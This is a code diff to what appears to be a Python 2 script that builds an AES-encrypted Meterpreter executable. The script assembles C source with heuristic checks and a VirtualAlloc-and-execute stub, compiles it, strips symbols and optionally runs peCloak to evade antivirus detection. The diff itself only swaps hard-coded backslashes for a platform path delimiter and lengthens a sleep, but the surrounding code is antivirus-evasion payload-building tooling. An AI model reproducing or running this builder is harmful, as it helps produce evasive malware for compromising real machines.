@@ -60,18 +60,24 @@ def main(argv):
   # Hold argument values in args
   args = vars(parser.parse_args())
 
+  path_delim = ''
+  if 'posix' in os.name:
+    path_delim = '/'
+  else:
+    path_delim = '\\'
+
   # Load configuration options
-  sys.path.append(os.getcwd() + '\\conf\\')
+  sys.path.append(os.getcwd() + path_delim + 'conf' + path_delim)
   import settings
 
   ip = args['ip']
   port = args['port']
-  clOptions = '/GS /GL /analyze- /Zc:wchar_t /Zi /Gm /O2 /sdl /fp:precise /D "WIN32" /D "NDEBUG" /D "_CONSOLE" /D "_UNICODE" /D "UNICODE" /errorReport:prompt /WX- /Zc:forScope /Gd /Oy- /Oi /MT /EHsc /Fe"' + settings.exeDir + '\\' + args['exe'] + '" /Fo"' + settings.exeDir + '\\' + args['exe'].split('.')[0] + '.obj " /Fd"' + settings.exeDir + '\\' + args['exe'].split('.')[0] + '" /nologo /I"' + settings.vsPath + '\\include" /I"' + settings.vsPath + '\\atlmfc\\include" /I"' + settings.sdkPath + '\\Include" "' + settings.sdkPath + '\\Lib\\AdvAPI32.Lib" "' + settings.sdkPath + '\\Lib\\Uuid.Lib" "' + settings.sdkPath + '\\Lib\\Kernel32.Lib" ' + settings.cryptLibPath + ' ' + settings.sourceDir + '\\' + args['file']
+  clOptions = '/GS /GL /analyze- /Zc:wchar_t /Zi /Gm /O2 /sdl /fp:precise /D "WIN32" /D "NDEBUG" /D "_CONSOLE" /D "_UNICODE" /D "UNICODE" /errorReport:prompt /WX- /Zc:forScope /Gd /Oy- /Oi /MT /EHsc /Fe"' + settings.exeDir + path_delim + args['exe'] + '" /Fo"' + settings.exeDir + path_delim + args['exe'].split('.')[0]  + '.obj " /Fd"' + settings.exeDir + path_delim + args['exe'].split('.')[0]  + '" /nologo /I"' + settings.vsPath + path_delim + 'include" /I"' + settings.vsPath + path_delim + 'atlmfc' + path_delim + 'include" /I"' + settings.sdkPath + path_delim + 'Include" "' + settings.sdkPath + path_delim + 'Lib' + path_delim + 'AdvAPI32.Lib" "' + settings.sdkPath + path_delim + 'Lib' + path_delim + 'Uuid.Lib" "' + settings.sdkPath + path_delim + 'Lib' + path_delim + 'Kernel32.Lib" ' + settings.cryptLibPath + ' ' + settings.sourceDir + path_delim + args['file']
 
   print '[+]  Preparing to create a Meterpreter executable'
 
   # Set the command line values
-  sourceFile = open(settings.sourceDir + '/' + args['file'], 'w')
+  sourceFile = open(settings.sourceDir + path_delim + args['file'], 'w')
 
   # Set DH parameter size
   dhLen = 1024
@@ -135,28 +141,28 @@ def main(argv):
   src += codesegments.mainStub(mainSt, heuristicFuncVar, mainDecrypted, mainEncodeKey, encKey, mainEncodeIv, encIv, mainDecodeCipher, mainFuncPayload, aesPayloadVar, mainAesDecryption, mainCbcDecryption, mainStfDecryptor, virtAllocFuncVar) + "\n"
   src += codesegments.virtualAllocStub(virtAllocFuncVar, virtAllocFuncParam, virtAllocLen, virtAllocPid, virtAllocCode, virtAllocAddr, virtAllocPage_size, execFuncVar, execParamVar) + "\n"
 
-  print '[-]\tWriting the source code to ' + settings.sourceDir + '\\' + args['file']
+  print '[-]\tWriting the source code to ' + settings.sourceDir + path_delim + args['file']
   sourceFile.write(src)
   sourceFile.close()
 
-  print '[-]\tCompiling the executable to ' + settings.exeDir + '\\' + args['exe']
+  print '[-]\tCompiling the executable to ' + settings.exeDir + path_delim + args['exe']
   subprocess.Popen('cl ' + clOptions, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
-  time.sleep(10)
+  time.sleep(30)
 
   if settings.useStrip == 1:
     print '[-]\tStripping debugging symbols'
-    subprocess.Popen('strip.exe -s ' + settings.exeDir + '\\' + args['exe'], stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+    subprocess.Popen('strip.exe -s ' + settings.exeDir + path_delim + args['exe'], stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
     time.sleep(5)
 
   if settings.usePeCloak == 1:
     print '[-]\tEncoding the PE file with peCloak'
-    subprocess.Popen('python ' + settings.peCloakPath + 'peCloak.py ' + os.getcwd() + '\\' + settings.exeDir + '\\' + args['exe'], stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+    subprocess.Popen('python ' + settings.peCloakPath + 'peCloak.py ' + os.getcwd() + path_delim + settings.exeDir + path_delim + args['exe'], stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
 
     time.sleep(60)
-    os.remove(os.getcwd() + '\\' + settings.exeDir + '\\' + args['exe'])
-    for file in os.listdir(os.getcwd() + '\\' + settings.exeDir + '\\'):
+    os.remove(os.getcwd() + path_delim + settings.exeDir + path_delim + args['exe'])
+    for file in os.listdir(os.getcwd() + path_delim + settings.exeDir + path_delim):
       if re.search('cloaked', file):
-        os.rename(os.getcwd() + '\\' + settings.exeDir + '\\' + file, os.getcwd() + '\\' + settings.exeDir + '\\' + args['exe'])
+        os.rename(os.getcwd() + path_delim + settings.exeDir + path_delim + file, os.getcwd() + path_delim + settings.exeDir + path_delim + args['exe'])
 
 if __name__ == '__main__':
   main(sys.argv[1:])
